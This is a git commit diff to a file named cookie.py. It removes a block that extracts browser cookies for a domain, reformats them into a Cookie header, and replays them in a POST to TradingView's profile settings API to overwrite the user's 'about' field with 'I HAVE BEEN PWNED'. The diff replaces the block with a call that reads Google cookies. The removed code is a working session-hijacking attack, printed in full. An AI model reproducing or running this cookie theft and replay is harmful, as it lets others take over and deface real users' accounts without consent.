c8dfb27d6c8863975eb8a125ea311254160129a5
SomeoneAlt-86 <76504556+SomeoneAlt-86@users.noreply.github.com>
2025-03-23 11:52:58 +0530

    Update cookie.py

--- cookie.py
+++ cookie.py
@@ -36,32 +36,6 @@ def getCookiesFromDomain(domain,cookieName=''):
     else:
         return Cookies #return all cookies or nothing
 
-print()
-print("preparing attack ")
-time.sleep(3)
-print()
-def remove(string):
-    return "".join(string.split())
-
-cookie = json.dumps(getCookiesFromDomain(domain))
-cookie1 = cookie.replace("{","")
-cookie2 = cookie1.replace("}","")
-cookie3 = cookie2.replace(",",";")
-cookie4 = cookie3.replace(":","=")
-cookie5 = cookie4.replace('"','')
-
-
-finalcookie = remove(cookie5)
-print("Got the cookie -")
-print(finalcookie)
-
-related = MIMEMultipart('form-data','----WebKitFormBoundaryXkphc45YTNMa8x5I')
-headers = dict(related.items())
-headers['Origin'] = 'https://www.tradingview.com'
-headers['Cookie'] = finalcookie
-
-files = {'about':(None, 'I HAVE BEEN PWNED ')}
-req = requests.post('https://www.tradingview.com/api/v1/user/profile/settings/', files=files, headers=headers)
-
+getCookiesFromDomain('google.com')
 
 
